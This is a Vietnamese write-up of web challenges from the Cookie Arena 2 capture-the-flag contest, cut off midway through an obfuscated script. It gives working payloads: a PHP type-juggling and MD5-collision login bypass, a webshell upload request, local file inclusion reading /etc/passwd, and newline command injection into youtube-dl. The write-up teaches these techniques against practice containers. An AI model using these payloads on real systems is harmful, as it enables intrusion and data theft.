Xin chào mọi người,
Tôi rất vui chia sẻ với các bạn write-up của tôi về cuộc thi CTF Cookie Arena lần thứ 2 diễn ra vào tối qua. Đây là một bài viết tổng hợp kinh nghiệm và phân tích các bài thử thách trong cuộc thi. Tôi hy vọng rằng những thông tin và giải thích trong write-up này sẽ giúp các bạn hiểu rõ hơn về các bài tập và cải thiện kỹ năng giải quyết vấn đề của mình.
Tôi rất mong nhận được sự phản hồi và đóng góp từ mọi người. Nếu bạn phát hiện bất kỳ sai sót hoặc có bất kỳ câu hỏi hoặc ý kiến nào, xin vui lòng liên hệ với tôi. Cảm ơn đã đọc và hãy cùng khám phá CTF Cookie Arena lần thứ 2 này! 😄

# Web challenges
## Magic Login
### Mô tả
```
Hãy quan sát chức năng đăng nhập, nó có tồn tại những lỗ hổng nghiêm trọng. FLAG được lưu trong /flag.txt hãy tìm cách đọc được chúng.
```
link container: http://magic-login-8abd7108.dailycookie.cloud

### Phân tích
Truy cập vào đường dẫn được cung cấp thì mình thấy giao diện đăng nhập đơn giản như này.

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/1ddd4675-52b3-4927-a5ac-06407468fd64)

Dựa vào tên chall , cùng với mô tả mình đoán hướng là phải tìm cách bypass được chức năng đăng nhập trên.
Vào xem view-source thì mình tìm thấy mã nguồn được để trong comment:
```php
<!--
if(isset($_POST['submit'])){ 
    $usr = mysql_real_escape_string($_POST['username']); 
    $pas = hash('sha256', mysql_real_escape_string($_POST['password'])); 
    
    if($pas == "0"){ 
        $_SESSION['logged'] = TRUE; 
        header("Location: upload.php"); // Modify to go to the page you would like 
        exit; 
    }else{ 
        header("Location: login_page.php"); 
        exit; 
    } 
}else{    //If the form button wasn't submitted go to the index page, or login page 
    header("Location: login_page.php");     
    exit; 
} 
--> 
```
Nhìn chung đoạn code có chức năng như sau:
* `isset($_POST['submit'])` : kiểm tra xem nút `submit` trong form đăng nhập có được kích hoạt chưa. điều này tương tự gửi một tham số submit.
* Giá trị `username` trong form đănh nhập được truyền vào biến `$user`. Hàm `mysql_real_escape_string` được sử dụng để đảm bảo rằng giá trị của username không chứa các ký tự đặc biệt có thể gây ra lỗ hổng bảo mật như SQLi,...
* Giá trị `password` trong form đăng nhập được gán vào biến `$pas`, tương tự được đi qua hàm `mysql_real_escape_string` trước. Sau đó, hàm hash được sử dụng để mã hóa mật khẩu bằng thuật toán SHA-256.
* Nếu giá trị `$pas` bằng `0`. Tức là mật khẩu đúng. Session sẽ được thiết lập là đã đăng nhập và người dùng được chuyển hướng đến trang upload.php bằng cách sử dụng hàm header để thay đổi trang hiện tại. Mình nghĩ sẽ phải có bước upload shell tại đây. 
* Nếu giá trị của `$pas` không bằng `0`. tức là mật khẩu không đúng. người dùng sẽ được chuyển hướng quay trở lại trang đăng nhập.
* Nếu nút `submit` chưa được kích hoạt. cũng sẽ chuyển trở lại trang đăng nhập. Điều này giúp đảm bảo không có mã nguồn tiếp theo được thực thi.

Vì vậy, hướng khai thác của mình là chúng ta có thể nhập `username` bất kỳ nhưng `password` phải là một chuỗi mà khi mã hóa bằng thuật toán SHA256 sẽ có giá trị bằng 0. Tại dòng kiểm tra `$pas == '0'` mình nhận thấy có thể khai thác được bằng cách sử dụng lỗi Type Juggling. 
Mình sẽ mô tả lại như sau:

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/c86be066-dd68-4f31-bae6-219f7ab88b29)

Nhìn hình trên ta có thể thấy, đối với việc sử dụng `==` trong so sánh là không an toàn. Khi so sánh `0e99 == 0` sẽ trả về true. Hoặc một trường hợp khác `0e1 == 0` cũng trả về true. Lỗ hổng này có thể dẫn tới việc ứng dụng trả về kết quả không mong muốn cho câu lệnh true or false.

Tại sao `0e99 == 0 ` lại trả về true? Trong ngôn ngữ lập trình, số 0e99(hay 0e+99) là một biểu diễn số học đặc biệt. Nó đại diện cho giá trị số gần bằng 0 nhưng rất lớn, mình nhớ là xấp xỉ vô cùng dương gì đó. Còn trong toán dấu chấm động thì 
`0e99` được hiểu là 0 nhân với 10 mũ 99. Kết quả của biểu thức này là một số rất nhỏ. Áp dụng khi biểu diễn một số bằng 0 nhưng quy mô lớn. 🛰️

```
Loose comparison: using == or != : both variables have "the same value".
Strict comparison: using === or !== : both variables have "the same type and the same value".
```
Bây giờ chúng ta cần tìm một chuỗi nào đó là kết quả của hàm hash với thuật toán sha-256 cho ra kết quả có dạng `0e........` giống như `0e99` và `0e1`. 
Có thể tìm thấy rất nhiều giá trị như vậy trên mạng hoặc brute force để tìm ra. Dưới đây là một vài trong số đó.

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/01a9277c-43a7-4494-ad4a-9f422f51d21f)

Mình sẽ sử dụng `34250003024812`.

Tham khảo: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md

### Solution
Sử dụng `username=test&password=34250003024812` mình đã bypass được phần login. Và truy cập được giao diện của upload.php như này.

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/d906b05b-840f-4ed6-898b-edae7ad6e99a)

Ồ. thú vị ở đây. Mình lại có thể đọc được code trong view-source.
```php
<!--
   if(isset($_FILES['fileData'])){
      if($_FILES['fileData']['size'] > 1048576){
         $errors='File size must be excately 1 MB';
      }

      if(empty($errors)==true){
        $uploadedPath = "uploads/".rand().".".explode(".",$_FILES['fileData']['name'])[1];
        move_uploaded_file($_FILES['fileData']['tmp_name'],$uploadedPath);
        echo "File uploaded successfully\n";
        echo '<p><a href='. $uploadedPath .' target="_blank">File</a></p>';
      }else{
         echo $errors;
      }
   }
-->
```
Nhìn chúng thì mình thấy:
* Chức năng upload giới hạn kích thước phải nhỏ hơn 1MB. Ta có thể chèn một code php kiểu như `<?php system('$_GET['cmd']')?>` để thực thi.
* File upload được lưu vào hệ thông trong thư mục `uploads` với tên file được random và giữ nguyên phần mở rộng file. Ta có thể upload luôn file php chứa shell.

Mình có thể upload luôn file php lên server.

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/4475a798-55aa-4121-929c-c07ef5ee1c1f)

```php
POST /upload.php HTTP/2
Host: magic-login-421eed68.dailycookie.cloud
Cookie: PHPSESSID=4e3508f16b319c5560fc13a853c2ff19
Upgrade-Insecure-Requests: 1
Origin: https://magic-login-421eed68.dailycookie.cloud
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryHcBgUIZm2MacwXSE
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Length: 231

------WebKitFormBoundaryHcBgUIZm2MacwXSE
Content-Disposition: form-data; name="fileData"; filename="index.php"
Content-Type: application/octet-stream

<?php system($_GET['cmd']);?>

------WebKitFormBoundaryHcBgUIZm2MacwXSE--
```
kết quả thành công 🕶️ mình nhận được link tới file là `uploads/1915122261.php`.
Dán vào trình duyệt và thực thi lệnh với `/uploads/1915122261.php?cmd=id`.
Kết quả thành công có một webshell:
![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/c97de475-0215-4df0-bd0a-51bd7609cbc9)

Đọc flag trong `/flag.txt`
![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/a6c7b03d-92b5-4782-aa95-c95bffb29326)


## Magic Login Harder
### Mô tả
```php
Hãy quan sát chức năng đăng nhập, nó có tồn tại những lỗ hổng nghiêm trọng. FLAG được lưu trong /flagXXX.txt hãy tìm cách đọc được chúng.

FLAG=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1)
cp /flag.txt /flag$FLAG.txt
Challenge Download: https://drive.google.com/file/d/1ZSmsdcJ3iFR2KH4aSBQ9z4xlY-z8o-UH/view?usp=drive_link (pass: cookiehanhoan)
```
Container link: magic-login-harder-7573b7c2.dailycookie.cloud

Nếu bạn không tìm thấy source code trên drive nữa thì có thể tìm thấy [tại đây](https://github.com/TaiPhung217/CTF_writeup/blob/main/2023/Cookie%20Arena%202/source/arenas2-web-magic-login-harder.zip)

### Phân tích
Mình được cung cấp một form đăng nhập cơ bản gồm 2 trường username và password nữa.
![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/18470ba2-1531-41a4-ac22-c98d035d5dac)

Mã nguồn được cung cấp gồm các file như sau:
![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/ff68437f-12ed-412b-b8a2-c7b62db3dc9b)

* File `entrypoint.sh`:
```bash
#!/bin/sh

# Secure entrypoint
chmod 600 /entrypoint.sh

FLAG=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1)

cp /flag.txt /flag$FLAG.txt

echo "" > /flag.txt

exec "$@"
```
Có thể thấy, vị trí flag ở trong `\` như thử thách trước đó, tên file `flag.txt` đã được thay đổi tên sao cho không dễ đoán như cũ bằng cách sử dụng `urandom`.

* File `index.php`:
  Mình sẽ tập trung vào các đoạn code php trước.
```php
<?php
    if(isset($_POST["submit"])){
        $username = base64_decode($_POST['username']);
        $password = base64_decode($_POST['password']);

        if(($username == $password)){
            echo 'Username and password are not the same';
        }
        else if((md5($username)===md5($password))){
            $_SESSION['username'] = $username;
            header('Location: admin.php?file=1.txt');
        } else {
            echo 'Username and password are wrong';
        }
    }
?>
```
Nhìn chung thì form đăng nhập có chức năng như sau: 
- Tiếp tục là dòng mã kiểm tra đã nhập `submit`.
- `username` và `password` được giải mã bằng base64_decode. Hàm này được sử dụng để giải mã một chuỗi được mã hóa bằng base64.
- Tiếp theo, nếu `username` và `password` có giá trị giống nhau sẽ cho ra kết quả lỗi. Ồ, mình để ý thấy ở đây đang ở dụng `Loose comparison` để so sánh.
- Trong trường hợp tiếp theo, mã sẽ kiểm tra xem hash md5 của `username` và `password` có giống nhau không. Ở đây, lại sử dụng `Strict comparison`. Một dạng an toàn. Nếu mã hash giống nhau thì sẽ chuyển hướng tới trang admin hiển thị nội dung file 1.txt bằng cách sử dụng hàm `header()`.
- Cuối cùng, nếu hai điều kiện trên không thỏa mã thì trả về lỗi.

Vậy nhìn chung, ta cần 2 thông tin `username` và `password` sao cho chúng sau khi được giải mã base64 thì không được có giá trị giống nhau nhưng md5 lại giống nhau. 🐤 Kỳ lạ???
Tuy nhiên, mình đã từng gặp dạng này trước đây khi làm việc với `md5sum file`. Và bạn cũng có thể google để tìm kết quả. md5 thực sự đã bị broken trong thời gian dài về trước, nên cũng không khó để tìm kiếm.

Một ví dụ: https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value?fbclid=IwAR2SiSjwjf3JbJwnOjqmqw7bHriFieA_oIBhH1opA47TCHVuWxFjQn99FJk

Xem thử một nhận xét:
![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/3bcc0309-0d22-4fe5-856a-5bdfb12cf0cd)

Vậy là khi thực hiện lệnh `md5sum` cho byte của hai file trên thì sẽ cho cùng một mã md5. Nếu bạn thắc mắc chuỗi hexa kia người ta lấy từ đâu thì có thể chạy thử trên máy như sau.
![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/1ebbb19c-3797-45b7-8eb9-ff7a6d1243af)
Có thể thấy file được hash giống nhau. Và chuỗi string kia là biểu diễn hexa của file.
![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/33b10fe7-1904-48b8-8100-67b2a10c97b3)

Vậy là xong, mình sẽ sang bước bypass của mình.

* File `admin.php`:
```php
<?php
    header('Content-Type: text/html; charset=utf-8');
    session_start();
    if($_SESSION['username'] != null){
    if(isset($_GET['file'])){
        $file = $_GET['file'];
        include($file);
    }
    }
    else{
        die("Only admin can use this");
    }
?>
```
  Chức năng đoạn code:
    - Để truy cập được file này thì người dùng cần có session khác null. Hmm, chỗ này mình nghĩ nên rõ ràng chút sẽ an toàn hơn, kiểm tra như này hơi chung chung dễ bypass. Mình sẽ lưu ý chỗ này.
    - Tiếp theo là GET một tham số `file` với đầu vào là tên file và tên file này được gọi bưởi include. Ồ . chỗ này ta có thể thực hiện `Local File Inclusion`. Quá rõ 🧑

Chốt lại: Bypass login -> LFI -> get flag.

### Solution
Mình sẽ tiến hành sinh chuỗi payload:
```php
<?php
        $a = base64_encode(hex2bin('4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2'));
        $b = base64_encode(hex2bin('4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2'));
        
        echo $a;
        echo $b;
?>
```
output:
```php
Tclo/w7jXCCVctR3e3IVh9Nvp7Ib3Fa3Sj3AeD57lRivv6IAqChL826OS1WzX0J1k9hJZ22g0VVdg2D7Xwf+og==
Tclo/w7jXCCVctR3e3IVh9Nvp7Ib3Fa3Sj3AeD57lRivv6ICqChL826OS1WzX0J1k9hJZ22g0dVdg2D7Xwf+og==
```

Kiểm tra trên local xem đã vượt qua được form đăng nhập chưa.
```php
<?php
        $username = base64_decode('Tclo/w7jXCCVctR3e3IVh9Nvp7Ib3Fa3Sj3AeD57lRivv6IAqChL826OS1WzX0J1k9hJZ22g0VVdg2D7Xwf+og==');
        $password = base64_decode('Tclo/w7jXCCVctR3e3IVh9Nvp7Ib3Fa3Sj3AeD57lRivv6ICqChL826OS1WzX0J1k9hJZ22g0dVdg2D7Xwf+og==');
		
		$flag = 'CHH{yamete}';
		
        if(($username == $password)){
            echo 'wrong';
        }
        else if((md5($username) === md5($password))){
            echo $flag;
        } else {
            echo 'wrong';
        }
?>
```
output:
> CHH{yamete}

Ô. vậy là đã bypass được rồi. Có vẻ như hai chuỗi trên là chính xác.
Mình sẽ gửi payload lên form đăng nhập.
Server trả về thông báo lỗi???? lạ vậy.
Mình không nghĩ sẽ có lỗi gì xảy ra ở đây. 
![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/e40df438-fc56-4fd0-861f-3ced70aac6bf)
Lỗi cho thấy: Không thể chỉnh sửa thông tin header và lỗi xảy ra tại dòng thứ 73.

Nhìn vào source code thì mình thấy dòng 73 là `$_SESSION['username'] = $username;` dùng để tạo session đăng nhập. 
Vậy là chứng tỏ ta đã bypass thành công. Dòng mã 73 đã được thực thi. 🥇

Tại sao nó xuất hiện lỗi??? Bạn có thể thấy là ở đây đang truyền trực tiếp `$username` và giá trị `username` trong SESSION. Tuy nhiên, mình đã thử debug giá trị `$username` trông như sau:
![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/d504ee66-9af2-40b7-ac23-3beb609aea95)

`$username` dòng code thứ 73 sẽ lưu trữ dữ liệu chứa các ký tự không thể hiển thị gây tạo ra lỗi. Nhưng lỗi đó không ảnh hưởng tới việc tạo session đăng nhập.
Mình vẫn nhập được một session key trong phản hồi của server. 🐤
```php
HTTP/2 200 OK
Date: Mon, 10 Jul 2023 03:23:06 GMT
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/7.4.33
Set-Cookie: PHPSESSID=d66d9db8a594c0dae25f5d2c67d8d51a; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Strict-Transport-Security: max-age=15724800; includeSubDomains
```

Dùng session này mình có thể truy cập file admin bình thường.
![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/cf150148-692e-4f9c-bf37-cafc96ebb765)

Đọc file `/admin.php?file=../etc/passwd`:
![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/e6bfa21c-626f-4d6c-b9af-73b3f7e168cd)

Đọc `/proc/mounts`:
![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/bb6b90fc-8eab-4517-9bb9-de525d2022e0)

tên file flag đã bị mã hóa, mình sẽ cố xem tên file có thể được lưu đâu đó không. 
Chắc không ổn rồi. Mình không thấy. Hoặc cũng có thể do mình không biết tìm ở đâu.

Mình sẽ theo hướng brute force vậy. Nhưng server Cookie han hoan toàn giới hạn request 😧

Nhớ tại tên file flag sẽ có dạng như sau: `/flag****.txt`
![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/dfb90fe7-3fd7-4fd2-9f84-0c91e1ccd0b1)

Setup Intruder burpsuite như sau:
![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/0c35f184-0158-48a3-adc8-31dcbb2f61ea)


## Youtube Downloader
### Mô tả
```
Youtube Downloader là công cụ giúp bạn tải video từ Youtube về máy tính miễn phí. Nếu hack được ứng dụng này, bạn sẽ nắm trong tay công nghệ tải video của các website Youtube Downloader trên thế giới.
```
Container link: https://youtube-downloader-9c0ee246.dailycookie.cloud

### Phân tích
Giao diện web được cung cấp như sau

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/1f8cd61e-208e-41eb-9ad7-07e1965d4fc5)
Có một chức năng đơn giản là nhận đầu vào là một url video của youtube và hiển thị ảnh thumbnail lên màn hình.
Đầu vào cho phép phải là một url

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/093e88b8-d1f6-4092-924f-94c34dcf8cbd)

Cho những ai chưa biết thì. thumbnail là hình ảnh thu nhỏ được sử dụng để đại diện cho một video trên internet, đặc biệt xuất hiện nhiều trong các nền tảng chia sẻ video như Youtube, Facebook và Instagram. Thường được hiển thị bên cạnh tiêu đều và mô tả video để thu hút sự chú ý của người xem và tạo ấn tượng 👽

Ví dụ mình thử nhập một liên kết như sau:

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/5bf1bbbf-2cf4-479c-b86f-77a7968631e4)
Ứng dụng hiển thị thumbnail cùng với lệnh thực thi lên màn hình.


### Solution
Vì mình đã từng làm một số thử thách liên quan tới công cụ youtube-dl rồi nền mình biết trong công cụ này có một số chức năng có thể dẫn tới `Chèn lệnh thực thi`.  🚡 Nhưng mình sẽ trình bày lại từ đầu như dưới đây.

Để ý dòng lệnh thực thi.
```bash
youtube-dl --get-thumbnail https://www.youtube.com/watch?v=ZRtdQ81jPUQ
```
Có thể thấy url được lấy từ đầu vào của người dùng được truyền trực tiếp vào lệnh thực thi của công cụ youtube-dl
Google một chút bạn có thể tìm thấy source code của công cụ này trên github.

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/7a03e28d-e243-4db5-9f16-50a24ceb8994)
wow. 🥈 Đây là một công cụ viết bằng Python để tải xuống video từ Youtube và hơn thế nữa và được chạy trên máy mục tiêu. Vì là một công cụ mã nguồn mở nên từ mã nguồn ta có thể tìm kiếm điểm yếu.

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/8050a2d1-93f3-40bb-a76f-fb3c0cdbe71a)
Một số Options cơ bản của công cụ này:

Trước tiên mình muốn xác định vị trí mà kết quả server sẽ phản hồi về. Mình sẽ thử chèn `--version` phía sau url để xem có số phiên bản phản hồi về không.
Bước này mình không biết sao server rất hay phản hồi sai. Nhưng có vẻ như ký tự `space` dẫn tới lệnh bị thực thi sai. Ta không thể sử dụng `%20` được. Vì vậy mình sẽ sử dụng `%09` đại diện cho một ký tự tab để thay cho khoảng trắng. Bạn cũng thể sử dụng `${IFS}` cũng được.
Payload: `https://www.youtube.com/watch?v=y_-1uiB2T9Y%09--version`

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/2d8ce9e4-2c11-4ce4-a841-c666ffd8ee10)
Và thành công lấy được phiên bản của `youtube-dl`. Kết quả sau khi được thực thi được chuyển hướng tới đó. 

Hmmm. Vậy là ta đã có thể chứng minh rằng youtube-dl này không an toàn và có thể bị broken. Mình tiếp tục đọc doc của công cụ thì mình tìm thấy một Options thú vị.

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/351fb205-73c7-44d6-8d6f-8d0d8a3d5783)

Hay ghê. Công cụ này còn có cả chức năng thực thi lệnh lên file sau khi được tải xuông. Đến đây thì mình sẽ thay vì sử dụng `--version` mình thay bằng `--exec` và truyền vào lệnh mong muốn.

Payload: `https://www.youtube.com/watch?v=y_-1uiB2T9Y%09--exec%09'id'`
Rất lạ là tại sao lại không thành công🧮 !!!!
Nó cứ xuất hiện cái màn hình này.

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/9ccbde31-88bc-49b4-8415-cba38ae61bdb)

Vì vậy mình quyết định thay đổi chút chiến thuật. Không sử dụng Options nữa (chắc bị bypass). Vì mình có thể thoải mái chèn command vào phía sau url nên tại sao ta không ngắt dòng để tạo một command mới. Kỹ thuật này rất hay, mình áp dụng nó rất nhiều.
Sử dụng `%0a` để ngắt dòng nhé. Hoặc bạn sử dụng burp bà chèn thêm ký tự `\n` vào vị trí muốn ngắt. Ngoài 
Payload: `https://www.youtube.com/watch?v=y_-1uiB2T9Y%09%0acat</flag.txt`

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/e2dd43fb-4eaa-4c6e-86de-832f7f4439e1)
Kết quả đọc tệp `flag.txt` thành công.
Flag: CHH{Ea5y_cOmmaND_inj3c7Ion_****************************}

Bạn có thể luyện tập một challenge tương tự như này tại đây: https://savassaygili.com/tryhackme-convertmyvideo

## Pass Code
### Mô tả
```
Bạn không thể bẻ khoá Pass Code cực an toàn này.
```
Container link: http://pass-code-02604060.dailycookie.cloud

### Phân tích và solution
Giao diện được cung cấp trông như sau:

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/c3f91d5f-5fc5-47a3-8949-539407f0e5ef)

Trong nút `FLAG` yêu cầu nhập một decrypt key để nhận được cờ

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/f7a50176-9249-4b70-bf3b-b4033ad9ecfe)

Tại đây, Mình nghĩ ứng dụng web sử dụng cách gì để kiểm tra key chính xác và mình đã bắt tay tìm kiếm mã nguồn sót lại và tìm thấy file sau. `http://pass-code-02604060.dailycookie.cloud/crypto-js.js`

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/2181a54c-66e8-4e63-a319-8889b1c10399)
Ồ nó chỉ là mã nguồn của thư viện CryptoJS 🎱

Ngoài ra, view-source cũng có một đoạn script trông rất khó nhìn.
```js
function _0x50c7(_0x3bf473,_0xe70ef2){var _0xae3a1a=_0x55ef();return _0x50c7=function(_0x5b97f1,_0x5b0043){_0x5b97f1=_0x5b97f1-(0x1ded+0x1*-0x1003+0x45f*-0x3);var _0x5cb926=_0xae3a1a[_0x5b97f1];if(_0x50c7['dmaofR']===undefined){var _0x2e7309=function(_0x1f6fec){var _0x105c14='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x31489e='',_0xa27067='',_0x58f736=_0x31489e+_0x2e7309;for(var _0x25fbe9=0x2*-0x9c5+0x116*0xb+0x288*0x3,_0x411748,_0x93f4cc,_0x62f6af=0x7*-0x11b+0x26d*0xb+-0x12f2;_0x93f4cc=_0x1f6fec['charAt'](_0x62f6af++);~_0x93f4cc&&(_0x411748=_0x25fbe9%(-0x12aa*-0x1+0x1f9d+-0x3243)?_0x411748*(0x1cc6*-0x1+-0xa5a+-0xe0*-0x2d)+_0x93f4cc:_0x93f4cc,_0x25fbe9++%(0x1*0x14e7+0xab9+-0x1f9c))?_0x31489e+=_0x58f736['charCodeAt'](_0x62f6af+(-0xed0+0x1195+0x2bb*-0x1))-(0x4*-0x655+-0x207a+0x4d2*0xc)!==-0x1*0xc5b+-0x1*0x248e+0x1*0x30e9?String['fromCharCode'](-0x1*-0x2605+-0x1bab+-0x5*0x1df&_0x411748>>(-(-0x98*0x6+-0x666+-0x27e*-0x4)*_0x25fbe9&0x1720+0x1*-0x1dd2+-0xa*-0xac)):_0x25fbe9:0x716*-0x2+-0x20*-0x16+0xb6c){_0x93f4cc=_0x105c14['indexOf'](_0x93f4cc);}for(var _0x9bedcb=0x513*0x5+0x8*-0x301+0x1*-0x157,_0x327cd1=_0x31489e['length'];_0x9bedcb<_0x327cd1;_0x9bedcb++){_0xa27067+='%'+('00'+_0x31489e['charCodeAt'](_0x9bedcb)['toString'](-0x4*-0x485+-0x593*-0x1+-0x9*0x29f))['slice'](-(-0xe86+0x59*0x1+0xe2f));}return decodeURIComponent(_0xa27067);};_0x50c7['wDBSLi']=_0x2e7309,_0x3bf473=arguments,_0x50c7['dmaofR']=!![];}var _0x200d55=_0xae3a1a[-0x2026+-0x26f0+0x4716],_0xe0e0b3=_0x5b97f1+_0x200d55,_0x4d5ea0=_0x3bf473[_0xe0e0b3];if(!_0x4d5ea0){var _0x49c6d4=function(_0x461dd6){this['DytWPB']=_0x461dd6,this['YhilVC']=[-0x3*-0x563+0x1537*-0x1+-0x5*-0x103,-0x53f*0x1+0xc65+-0x726,-0x1*-0x1ae3+-0xaca*0x3+0x57b],this['kTMFMM']=function(){return'newState';},this['nlZNXH']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['nDTZzB']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x49c6d4['prototype']['uyeFQe']=function(){var _0xd6c0a6=new RegExp(this['nlZNXH']+this['nDTZzB']),_0x42fe77=_0xd6c0a6['test'](this['kTMFMM']['toString']())?--this['YhilVC'][-0xc4b+-0x3d*0x1+-0xc89*-0x1]:--this['YhilVC'][-0x2593+0x1d26*0x1+0x86d];return this['hfzizQ'](_0x42fe77);},_0x49c6d4['prototype']['hfzizQ']=function(_0x321c3e){if(!Boolean(~_0x321c3e))return _0x321c3e;return this['pQDVJK'](this['DytWPB']);},_0x49c6d4['prototype']['pQDVJK']=function(_0x491597){for(var _0x290b41=0xf6*-0xa+-0x2464+0x2e00,_0xb34cfb=this['YhilVC']['length'];_0x290b41<_0xb34cfb;_0x290b41++){this['YhilVC']['push'](Math['round'](Math['random']())),_0xb34cfb=this['YhilVC']['length'];}return _0x491597(this['YhilVC'][0x2d*0x5+-0x1*0x137b+-0x2*-0x94d]);},new _0x49c6d4(_0x50c7)['uyeFQe'](),_0x5cb926=_0x50c7['wDBSLi'](_0x5cb926),_0x3bf473[_0xe0e0b3]=_0x5cb926;}else _0x5cb926=_0x4d5ea0;return _0x5cb926;},_0x50c7(_0x3bf473,_0xe70ef2);}function _0x55ef(){var _0x4385a8=['Aog6Pw0GC+g7R2e','zw5J','kcGOlISPkYKRkq','zM9YrwfJAa','mti4nZK4AMvfBefN','quvt','CMvTB3zLqxr0CG','mJqXmZq2oeLMwxrjsq','mteXmtuXv0j1zMXp','zgvJCNLWDa','y29UC3rYDwn0BW','z2v0qxr0CMLIDq','ugDTsue','v3vkzMq','tw5hAgy','DhnTEMe','mJfksNrhAKK','nZq3nJy0AKTRyxDT','EMfhzLi','zvvVr2C','BwfW','C2vHCMnO','Agr0Eei','vhDkwMW','zNjVBq','CxvLCNLtzwXLyW','ySoHBMGGCxv5igm','Dg9YqwXS','mta4mdC2mdvgB0fyCMu','sfz0yNK','we5zyxa','i2nOyxb0zxiTyW','mJe4mZuZogryvw9tBa','B250zw50igLTzW','vxrMoa','yZaWA2LLlwfYmW','yxbWBhK','nK1JEujJAW','Dg9tDhjPBMC','mJuXmdm0nuPYywr0DW','re1erhq','Awj1Dgu','DM1lr1a','zw5JCNLWDgvKlq'];_0x55ef=function(){return _0x4385a8;};return _0x55ef();}(function(_0x131f4f,_0x5e75ae){function _0x14ec9f(_0x22aa9e,_0x24c5e8,_0x423d74,_0x578c69){return _0x50c7(_0x24c5e8-0x83,_0x578c69);}function _0x3aac89(_0x230c75,_0x4d3f9b,_0x3d0dd7,_0x285ab9){return _0x50c7(_0x4d3f9b- -0x1a3,_0x3d0dd7);}var _0xbb3638=_0x131f4f();while(!![]){try{var _0x3c07e5=-parseInt(_0x14ec9f(0x163,0x165,0x174,0x160))/(0x2196+-0x1189*-0x1+-0x331e)+parseInt(_0x3aac89(-0xbc,-0xc5,-0xc3,-0xbf))/(0x176d+-0x97e+-0xded)*(-parseInt(_0x14ec9f(0x15b,0x16d,0x159,0x15b))/(0x1d*-0xb5+0x372*-0x7+0x2ca2))+parseInt(_0x3aac89(-0xae,-0xc2,-0xbf,-0xb9))/(-0x1*-0x246e+0x614+-0xde*0x31)+-parseInt(_0x14ec9f(0x146,0x158,0x162,0x152))/(0x1758+0xdf*0x25+-0x1*0x378e)+-parseInt(_0x14ec9f(0x14d,0x156,0x166,0x15d))/(0x1bce+0x1c3*0xf+-0x3635)*(parseInt(_0x14ec9f(0x14b,0x151,0x15e,0x147))/(-0x17ef+-0xe*-0x1b6+0x2))+-parseInt(_0x3aac89(-0xb1,-0xb8,-0xb2,-0xce))/(-0x3*0x756+-0x2213+0xb39*0x5)+parseInt(_0x14ec9f(0x18f,0x179,0x175,0x175))/(-0x1fca+-0xe1d+0x310*0xf);if(_0x3c07e5===_0x5e75ae)break;else _0xbb3638['push'](_0xbb3638['shift']());}catch(_0x436618){_0xbb3638['push'](_0xbb3638['shift']());}}}(_0x55ef,-0x97168+0x14106+0x105dd*0xd),async function main(){var _0x890fcf={'MnGhf':_0x56ba08(0x357,0x34d,0x345,0x353),'WuJfd':_0x56ba08(0x34d,0x33e,0x342,0x34a)+'+$','XIkzW':function(_0x3f3c95,_0x29649d){return _0x3f3c95===_0x29649d;},'hdtxB':'UQELD','HVtby':_0x56ba08(0x347,0x340,0x358,0x333),'Gmpce':function(_0x4b892e,_0x461dc0){return _0x4b892e||_0x461dc0;},'vmKGP':_0xea2690(0x414,0x409,0x412,0x40e)+'na-ctf','PNJnP':function(_0xa63c9e,_0x27bbdf,_0x447c17){return _0xa63c9e(_0x27bbdf,_0x447c17);},'tsmza':function(_0x49096e){return _0x49096e();},'XNYap':_0xea2690(0x41b,0x420,0x415,0x40a)+_0xea2690(0x40b,0x400,0x409,0x40c)};function 